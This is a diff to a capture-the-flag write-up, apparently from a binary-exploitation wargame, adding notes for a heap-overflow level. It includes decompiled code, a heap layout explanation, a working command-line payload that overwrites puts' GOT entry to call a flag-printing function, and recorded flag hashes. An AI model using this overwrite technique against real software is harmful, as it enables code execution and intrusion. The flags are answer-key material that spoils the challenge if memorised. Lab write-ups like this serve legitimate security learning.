@@ -192,7 +192,60 @@ A * 64 remplit les données de _dest
 A * 8 remplit le chunk header du malloc de puVar1
 l'addresse de n (0x08048454) est écrite dans puVar1
 quand le pointeur de fonction (*(code *)*puVar1)() est appelé, il exécute la fonction n
+
 ## flag : f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 
 # flag 07
+
+undefined4 main(undefined4 param_1,int param_2)
+
+{
+  undefined4 *puVar1;
+  void *pvVar2;
+  undefined4 *puVar3;
+  FILE *__stream;
+  
+  puVar1 = malloc(8);
+  *puVar1 = 1;
+  pvVar2 = malloc(8);
+  puVar1[1] = pvVar2;
+  puVar3 = malloc(8);
+  *puVar3 = 2;
+  pvVar2 = malloc(8);
+  puVar3[1] = pvVar2;
+  strcpy((char *)puVar1[1],*(char **)(param_2 + 4));
+  strcpy((char *)puVar3[1],*(char **)(param_2 + 8));
+  __stream = fopen("/home/user/level8/.pass","r");
+  fgets(c,0x44,__stream);
+  puts("~~");
+  return 0;
+}
+
+
+during execution the heap looks like this :
+0000 0x10 [var 1]
+0000 0x10 [first malloc of var 2]
+0000 0x10 [var 3]
+0000 0x10 [var 2]
+
+the first strcpy writes in puVar1[1] which points to the firstly allocated malloc of pvVar2
+the second strcpy writes in puVar3[1] which points to the actual value of pvVar2
+
+although by doing a buffer overflow we can overwrite a string until it reaches puVar3[1]
+by doing so we overwrite the malloc chunk header of puVar3 although it doesn't matter because the header is not used again afterwards
+(no malloc or free calls)
+
+payload of first arg is:
+padding : A * 20 (from first pvVar2 alloc it requires 8 bytes (data section) + 8 bytes (puVar3 chunk header) + 4 bytes (puVar3[0]) = 20)
+address of the GOT of puts : 0x08049928
+
+payload of second arg is:
+address of the m function we need to call to print the flag : 0x080484f4
+
+./level7 $(python -c 'print(("A" * 20) + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
+
+## flag : 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+
+# flag 08
+
 
